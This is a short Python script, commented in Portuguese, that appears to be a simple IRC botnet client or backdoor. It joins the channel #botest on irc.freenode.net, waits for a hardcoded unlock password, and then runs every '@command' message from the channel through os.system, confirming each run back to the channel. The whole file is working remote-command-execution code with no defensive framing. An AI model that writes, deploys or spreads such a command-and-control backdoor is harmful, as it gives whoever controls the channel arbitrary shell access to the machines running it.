import socket, os, time
from re import search

# Config IRC server
server = 'irc.freenode.net'
porta = 6667
canal = "#botest"
nick = "gelo"
password = "oleg"

# socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((server, porta))
s.send('NICK %s\r\n' %nick)
s.send('USER ' + nick + ' ' + nick + ' ' + nick + ' .:\n')
s.send('Join %s\r\n' %canal)
time.sleep(2)
print (s.recv(1024))

# Verificar conexão
status = False
while status != True:
    msg = s.recv(5000)
    print (msg)
    if msg[0:4] == 'PING':
        s.send(msg.replace('PING', 'PONG'))
    if search('@ligar %s' %password, msg):
        status = True
        s.send('PRIVMSG %s: Conectado com sucesso!\r\n' %canal)

# Receber comandos
while True:
    msg = s.recv(5000)
    print (msg)
    if msg[0:4] == 'PING':
        s.send(msg.replace('PING', 'PONG'))
    if search('@command', msg):
        msg = msg.split('@command')
        msg = msg[1].split('\r\n')
        os.system(msg[0])
        s.send('PRIVMSG %s : Comando [ %s ] executado com sucesso!\r\n' %(canal, str(msg[0])))
